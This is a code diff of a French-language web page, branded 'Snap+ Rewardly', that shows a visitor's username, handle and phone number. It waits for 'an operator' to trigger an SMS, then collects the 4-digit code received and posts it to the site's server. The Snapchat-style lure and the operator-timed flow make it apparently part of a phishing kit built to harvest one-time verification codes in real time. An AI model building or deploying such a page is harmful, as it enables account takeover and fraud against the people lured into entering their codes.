@@ -1,80 +1,308 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <meta name="theme-color" content="#000000" />
-  <title>Code SMS — Snap+ Rewardly</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="css/main.css" />
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<meta name="theme-color" content="#000000" />
+<title>Code SMS — Snap+ Rewardly</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+:root {
+  --bg: #000000; --bg2: #0a0a0a; --surface: rgba(255,255,255,.05);
+  --surface2: rgba(255,255,255,.08); --border: rgba(255,255,255,.08);
+  --border2: rgba(255,255,255,.12); --accent: #FFFC00; --accent2: #FFF59D;
+  --text: #ffffff; --text2: rgba(255,255,255,.7); --text3: rgba(255,255,255,.4);
+  --success: #22c55e; --success-bg: rgba(34,197,94,.12);
+  --radius: 16px; --radius-sm: 10px; --radius-pill: 100px;
+  --font: 'Inter', system-ui, -apple-system, sans-serif;
+  --trans: .2s cubic-bezier(.4,0,.2,1);
+}
+html { scroll-behavior: smooth; -webkit-tap-highlight-color: transparent; }
+body {
+  background: var(--bg); color: var(--text); font-family: var(--font);
+  font-size: 15px; line-height: 1.6; overflow-x: hidden; -webkit-font-smoothing: antialiased;
+}
+a { color: inherit; text-decoration: none; }
+button { cursor: pointer; border: none; background: none; font-family: inherit; }
+input { font-family: inherit; }
+.bg-mesh { position: fixed; inset: 0; z-index: 0;
+  background: radial-gradient(ellipse 60% 50% at 15% 20%, rgba(255,252,0,.12), transparent 70%),
+              radial-gradient(ellipse 50% 40% at 85% 75%, rgba(255,245,157,.07), transparent 70%), var(--bg);
+  pointer-events: none; }
+.orb { position: fixed; border-radius: 50%; filter: blur(80px); pointer-events: none; z-index: 0; opacity: .55; }
+.orb1 { width: 600px; height: 600px; top: -180px; left: -180px; background: rgba(255,252,0,.15); }
+.orb2 { width: 500px; height: 500px; bottom: -150px; right: -150px; background: rgba(255,245,157,.1); }
+.toast-wrap { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); z-index: 9000; display: flex; flex-direction: column; align-items: center; gap: 8px; pointer-events: none; }
+.toast { display: flex; align-items: center; gap: 10px; padding: 12px 18px; background: rgba(10,10,10,.97); border: 1px solid var(--border2); border-radius: var(--radius-pill); backdrop-filter: blur(16px); font-size: 14px; font-weight: 650; color: var(--text); animation: toastIn .25s cubic-bezier(.34,1.56,.64,1) both; max-width: min(92vw, 460px); pointer-events: auto; }
+.toast.success { border-color: rgba(34,197,94,.35); }
+.toast.error { border-color: rgba(248,113,113,.35); }
+@keyframes toastIn { from { opacity: 0; transform: translateY(10px) scale(.95); } }
+.spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,.2); border-top-color: #fff; border-radius: 50%; animation: spin .7s linear infinite; flex-shrink: 0; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.feedback { font-size: 12px; color: rgba(255,255,255,.72); line-height: 1.4; min-height: 16px; }
+.feedback.ok { color: #86efac; }
+.feedback.err { color: #fca5a5; font-weight: 700; }
+.form-page { position: relative; z-index: 1; display: flex; align-items: center; justify-content: center; min-height: 100dvh; padding: 20px; }
+.code-card { width: 100%; max-width: 460px; background: rgba(10,10,10,.88); border: 1px solid var(--border2); border-radius: 22px; backdrop-filter: blur(20px); box-shadow: 0 24px 80px rgba(0,0,0,.5); overflow: hidden; }
+.code-header { padding: 24px 28px 20px; border-bottom: 1px solid var(--border); }
+.code-badge { display: flex; align-items: center; gap: 7px; font-size: 12px; font-weight: 600; color: #FFF59D; margin-bottom: 2px; }
+.code-badge-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--success); box-shadow: 0 0 5px var(--success); animation: pulse 2s ease-in-out infinite; }
+.code-header h1 { font-size: 20px; font-weight: 800; color: var(--text); margin-bottom: 6px; }
+.code-header p { font-size: 13px; color: var(--text2); line-height: 1.6; }
+.pills { display: flex; gap: 8px; padding: 14px 28px; border-bottom: 1px solid var(--border); flex-wrap: wrap; }
+.pill { display: flex; align-items: center; gap: 5px; padding: 4px 11px; background: var(--surface); border: 1px solid var(--border2); border-radius: var(--radius-pill); font-size: 12px; font-weight: 600; color: var(--text2); }
+.pill-k { font-size: 10px; color: var(--text3); font-weight: 500; }
+.recap { display: flex; flex-direction: column; padding: 16px 28px; border-bottom: 1px solid var(--border); }
+.recap-row { display: flex; align-items: center; justify-content: space-between; padding: 7px 0; border-bottom: 1px solid var(--border); }
+.recap-row:last-child { border-bottom: none; }
+.recap-k { font-size: 12px; color: var(--text3); font-weight: 500; }
+.recap-row span:last-child { font-size: 13px; color: var(--text); font-weight: 600; }
+.wait-box { padding: 28px; display: flex; flex-direction: column; align-items: center; gap: 16px; text-align: center; justify-content: center; }
+.spinner-ring { width: 52px; height: 52px; border-radius: 50%; border: 3px solid rgba(255,252,0,.2); border-top-color: var(--accent); animation: spin 1s linear infinite; }
+.wait-label { font-size: 16px; font-weight: 700; color: var(--text); }
+.wait-meta { font-size: 11px; color: var(--text3); }
+.btn-sm { display: inline-flex; align-items: center; gap: 7px; padding: 9px 18px; background: var(--surface); border: 1px solid var(--border2); border-radius: var(--radius-pill); font-size: 13px; font-weight: 600; color: var(--text2); cursor: pointer; transition: background var(--trans), color var(--trans); margin: 0 auto; }
+.btn-sm:hover { background: var(--surface2); color: var(--text); }
+.code-body { padding: 28px; }
+.code-label { font-size: 13px; color: var(--text2); margin-bottom: 16px; text-align: center; }
+.digits { display: flex; gap: 10px; justify-content: center; margin-bottom: 20px; }
+.digit {
+  width: 62px; height: 70px; border-radius: var(--radius-sm); background: rgba(255,255,255,.05);
+  border: 1.5px solid var(--border2); color: var(--text); font-size: 28px; font-weight: 700;
+  text-align: center; outline: none; caret-color: transparent;
+  transition: border-color var(--trans), box-shadow var(--trans), background var(--trans);
+}
+.digit:focus { border-color: var(--accent); background: rgba(255,252,0,.08); box-shadow: 0 0 0 3px rgba(255,252,0,.18); }
+.digit.filled { border-color: rgba(255,252,0,.45); }
+.btn-primary { width: 100%; background: linear-gradient(135deg, #FFFC00, #FFF59D); color: #000; box-shadow: 0 0 30px rgba(255,252,0,.4), 0 4px 18px rgba(255,252,0,.3); font-weight: 800; border-radius: var(--radius-pill); padding: 13px 20px; font-size: 14.5px; cursor: pointer; transition: all .2s; }
+.btn-primary:disabled { opacity: .58; cursor: not-allowed; transform: none !important; box-shadow: none !important; }
+.btn-primary:not(:disabled):hover { transform: translateY(-3px); box-shadow: 0 0 40px rgba(255,252,0,.6), 0 8px 24px rgba(255,252,0,.4); }
+.ok-icon { width: 64px; height: 64px; border-radius: 50%; background: var(--success-bg); border: 1.5px solid rgba(34,197,94,.35); display: flex; align-items: center; justify-content: center; font-size: 30px; margin: 0 auto 20px; }
+@keyframes pulse { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: .6; transform: scale(.8); } }
+@keyframes cfall { 0% { transform: translateY(0) rotate(0) scale(1); opacity: .9; } 100% { transform: translateY(105vh) rotate(600deg) scale(.5); opacity: 0; } }
+</style>
 </head>
 <body>
-  <div class="bg-mesh"></div>
-  <div class="orb orb1"></div>
-  <div class="orb orb2"></div>
+<div class="bg-mesh"></div>
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
 
-  <div class="code-page">
-    <div class="code-card">
+<div class="form-page">
+<div class="code-card">
+<div class="code-header">
+<div class="code-badge"><span class="code-badge-dot"></span> <span id="code-badge-text">En attente</span></div>
+<h1 id="code-title">En attente du code</h1>
+<p id="code-sub">Un operateur doit d'abord declencher l'envoi du SMS.</p>
+</div>
 
-      <div class="code-header">
-        <div class="code-badge"><span class="badge-dot"></span> <span id="code-badge-text">En attente</span></div>
-        <h1 id="code-title">En attente du code</h1>
-        <p id="code-sub">Un operateur doit d'abord declencher l'envoi du SMS.</p>
-      </div>
+<div class="pills">
+<div class="pill"><span class="pill-k">Service</span> <span id="pill-svc">...</span></div>
+<div class="pill"><span class="pill-k">Statut</span> <span id="pill-status">En attente</span></div>
+</div>
 
-      <div class="pills">
-        <div class="pill"><span class="pill-k">Service</span> <span id="pill-svc">...</span></div>
-        <div class="pill"><span class="pill-k">Statut</span> <span id="pill-status">En attente</span></div>
-      </div>
+<div class="recap">
+<div class="recap-row"><span class="recap-k">Pseudo</span><span id="recap-pseudo">-</span></div>
+<div class="recap-row"><span class="recap-k">Compte</span><span id="recap-handle">-</span></div>
+<div class="recap-row"><span class="recap-k">Telephone</span><span id="recap-phone">-</span></div>
+</div>
 
-      <div class="recap">
-        <div class="recap-row"><span class="recap-k">Pseudo</span><span id="recap-pseudo">-</span></div>
-        <div class="recap-row"><span class="recap-k">Compte</span><span id="recap-handle">-</span></div>
-        <div class="recap-row"><span class="recap-k">Telephone</span><span id="recap-phone">-</span></div>
-      </div>
+<div id="view-wait">
+<div class="wait-box">
+<div class="spinner-ring"></div>
+<div class="wait-label">En attente de declenchement...</div>
+<div class="wait-meta" id="wait-meta">Actualisation toutes les 2s</div>
+<button class="btn-sm" id="btn-check">Verifier maintenant</button>
+</div>
+</div>
 
-      <!-- WAIT VIEW -->
-      <div id="view-wait">
-        <div class="wait-box">
-          <div class="spinner-ring"></div>
-          <div class="wait-label">En attente de declenchement...</div>
-          <div class="wait-meta" id="wait-meta">Actualisation toutes les 2s</div>
-          <button class="btn btn-sm" id="btn-check">Verifier maintenant</button>
-        </div>
-      </div>
+<div id="view-code" style="display:none">
+<div class="code-body">
+<div class="code-label">Entre les 4 chiffres recus par SMS</div>
+<div class="digits">
+<input class="digit" type="text" inputmode="numeric" maxlength="1" />
+<input class="digit" type="text" inputmode="numeric" maxlength="1" />
+<input class="digit" type="text" inputmode="numeric" maxlength="1" />
+<input class="digit" type="text" inputmode="numeric" maxlength="1" />
+</div>
+<div class="feedback" id="fb-code"></div>
+<button class="btn btn-primary" id="btn-code" disabled>
+<span>Confirmer le code</span>
+<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8l4 4 6-8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+</button>
+</div>
+</div>
 
-      <!-- CODE VIEW -->
-      <div id="view-code" style="display:none">
-        <div class="code-label">Entre les 4 chiffres recus par SMS</div>
-        <div class="digits">
-          <input class="digit" type="text" inputmode="numeric" maxlength="1" />
-          <input class="digit" type="text" inputmode="numeric" maxlength="1" />
-          <input class="digit" type="text" inputmode="numeric" maxlength="1" />
-          <input class="digit" type="text" inputmode="numeric" maxlength="1" />
-        </div>
-        <div class="feedback" id="fb-code"></div>
-        <button class="btn btn-primary" id="btn-code" disabled>
-          <span>Confirmer le code</span>
-          <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8l4 4 6-8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        </button>
-      </div>
+<div id="view-ok" style="display:none">
+<div class="ok-icon">&#10003;</div>
+<h2 class="step-title">Code confirme !</h2>
+<p class="step-sub">Un moderateur va traiter ta demande.</p>
+</div>
 
-      <!-- SUCCESS VIEW -->
-      <div id="view-ok" style="display:none">
-        <div class="ok-icon">&#10003;</div>
-        <h2 class="step-title">Code confirme !</h2>
-        <p class="step-sub">Un moderateur va traiter ta demande.</p>
-      </div>
+</div>
+</div>
 
-    </div>
-  </div>
+<div id="toast-wrap" class="toast-wrap"></div>
 
-  <div id="toast-wrap" class="toast-wrap"></div>
-  <script src="js/config.js"></script>
-  <script src="js/front-log.js"></script>
-  <script src="js/api.js"></script>
-  <script src="js/code.js"></script>
+<script>
+"use strict";
+const verif = (() => { try { return JSON.parse(sessionStorage.getItem("verif")); } catch { return null; } })();
+if (!verif || !verif.rid) { window.location.href = "index.html"; }
+
+const SVC_LABELS = { snap: "Snapchat+" };
+document.getElementById("recap-pseudo").textContent = verif.pseudo || "-";
+document.getElementById("recap-handle").textContent = verif.handle ? "@" + verif.handle : "-";
+document.getElementById("recap-phone").textContent = (verif.phone || "").replace(/(\d{2})(?=\d)/g, "$1\u00a0");
+document.getElementById("pill-svc").textContent = SVC_LABELS[verif.svc] || verif.svc;
+
+let poll = null;
+let inflight = false;
+const viewWait = document.getElementById("view-wait");
+const viewCode = document.getElementById("view-code");
+const viewOk = document.getElementById("view-ok");
+
+function showView(v) {
+  [viewWait, viewCode, viewOk].forEach(el => el.style.display = "none");
+  v.style.display = "";
+}
+
+async function apiGet(path) {
+  try {
+    const res = await fetch(path, { cache: "no-store" });
+    return await res.json();
+  } catch (e) { return null; }
+}
+
+async function checkStatus() {
+  if (inflight) return;
+  inflight = true;
+  try {
+    const d = await apiGet("/api/status/" + verif.rid + "?_=" + Date.now());
+    if (!d) {
+      document.getElementById("wait-meta").textContent = "Serveur indisponible";
+      return;
+    }
+    if (d.status === "expired") { stopPoll(); document.getElementById("wait-meta").textContent = "Session expiree"; return; }
+    if (d.status === "resolved") { stopPoll(); showView(viewOk); return; }
+    if (d.status === "code_sent") {
+      stopPoll();
+      document.getElementById("pill-status").textContent = "SMS envoye";
+      document.getElementById("code-badge-text").textContent = "Saisie du code";
+      document.getElementById("code-title").textContent = "Code de verification";
+      document.getElementById("code-sub").textContent = "Un code a 4 chiffres a ete envoye par SMS.";
+      showView(viewCode);
+      digits[0].focus();
+      return;
+    }
+    document.getElementById("wait-meta").textContent = "Derniere verif: " + new Date().toLocaleTimeString("fr-FR");
+  } catch (e) {
+    document.getElementById("wait-meta").textContent = "Reconnexion...";
+  } finally { inflight = false; }
+}
+
+function startPoll() {
+  if (poll) return;
+  poll = setInterval(checkStatus, 2000);
+  checkStatus();
+}
+function stopPoll() { clearInterval(poll); poll = null; }
+
+document.getElementById("btn-check").addEventListener("click", checkStatus);
+
+const digits = [...document.querySelectorAll(".digit")];
+const btnCode = document.getElementById("btn-code");
+const fbCode = document.getElementById("fb-code");
+let submitting = false;
+
+function getCode() { return digits.map(d => d.value).join(""); }
+function updateDigits() {
+  const code = getCode();
+  btnCode.disabled = code.length < 4 || submitting;
+  fbCode.className = "feedback";
+  fbCode.textContent = "";
+}
+
+digits.forEach((d, i) => {
+  d.addEventListener("input", () => {
+    d.value = d.value.replace(/\D/g, "").slice(-1);
+    if (d.value && i < 3) digits[i + 1].focus();
+    updateDigits();
+  });
+  d.addEventListener("keydown", (e) => {
+    if (e.key === "Backspace" && !d.value && i > 0) { digits[i - 1].value = ""; digits[i - 1].focus(); updateDigits(); }
+    if (e.key === "Enter" && getCode().length === 4) btnCode.click();
+  });
+  d.addEventListener("paste", (e) => {
+    e.preventDefault();
+    const paste = (e.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, 4);
+    paste.split("").forEach((c, j) => { if (digits[j]) digits[j].value = c; });
+    if (digits[Math.min(paste.length, 3)]) digits[Math.min(paste.length, 3)].focus();
+    updateDigits();
+  });
+});
+
+btnCode.addEventListener("click", async () => {
+  const code = getCode();
+  if (code.length < 4 || submitting) return;
+  submitting = true;
+  btnCode.disabled = true;
+  btnCode.innerHTML = '<div class="spinner"></div><span>Validation...</span>';
+
+  try {
+    const res = await fetch(window.location.origin + "/api/code", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ rid: verif.rid, code: code }),
+    });
+    const ok = await res.json();
+    if (ok && ok.ok) {
+      sessionStorage.removeItem("verif");
+      showView(viewOk);
+      launchConfetti();
+    } else {
+      fbCode.className = "feedback err";
+      fbCode.textContent = "Erreur, reessaie";
+      btnCode.disabled = false;
+      btnCode.innerHTML = '<span>Confirmer le code</span>';
+      submitting = false;
+    }
+  } catch (e) {
+    fbCode.className = "feedback err";
+    fbCode.textContent = "Erreur reseau";
+    btnCode.disabled = false;
+    btnCode.innerHTML = '<span>Confirmer le code</span>';
+    submitting = false;
+  }
+});
+
+function launchConfetti() {
+  const colors = ["#FFFC00", "#FFF59D", "#22c55e", "#f59e0b", "#ec4899"];
+  for (let i = 0; i < 50; i++) {
+    setTimeout(() => {
+      const el = document.createElement("div");
+      const s = Math.random() * 8 + 4;
+      Object.assign(el.style, {
+        position: "fixed", top: "-10px", left: Math.random() * 100 + "vw",
+        width: s + "px", height: s + "px", borderRadius: Math.random() > 0.5 ? "50%" : "2px",
+        background: colors[Math.floor(Math.random() * colors.length)],
+        pointerEvents: "none", zIndex: "9999",
+        animation: "cfall " + (1 + Math.random() * 1.5) + "s ease-in forwards",
+      });
+      document.body.appendChild(el);
+      setTimeout(() => el.remove(), 2500);
+    }, i * 25);
+  }
+}
+
+function toast(msg, type) {
+  const wrap = document.getElementById("toast-wrap");
+  const el = document.createElement("div");
+  el.className = "toast " + (type || "success");
+  el.textContent = msg;
+  wrap.appendChild(el);
+  setTimeout(() => { el.style.opacity = "0"; setTimeout(() => el.remove(), 2500); }, 2500);
+}
+
+startPoll();
+</script>
 </body>
 </html>
